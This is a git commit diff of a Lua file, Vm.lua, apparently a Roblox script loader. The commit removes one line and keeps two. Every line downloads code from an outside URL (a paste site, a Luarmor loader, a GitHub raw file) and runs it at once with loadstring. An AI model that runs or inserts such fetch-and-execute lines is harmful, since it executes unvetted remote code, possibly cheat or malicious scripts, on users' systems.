e2bc3bdce157ba348a470c329a1df33d98f9d054
Tkdaisuki <morimoto.shun@icloud.com>
2026-03-23 22:57:12 +0900

    Update Vm.lua

--- Vm.lua
+++ Vm.lua
@@ -1,3 +1,2 @@
 loadstring(game:HttpGet("https://pastefy.app/gGXxQTqG/raw"))()
-loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/8273322905877bb11fbc66b9de390b7e.lua"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Tokinu/Flash/refs/heads/main/TP/Block"))()
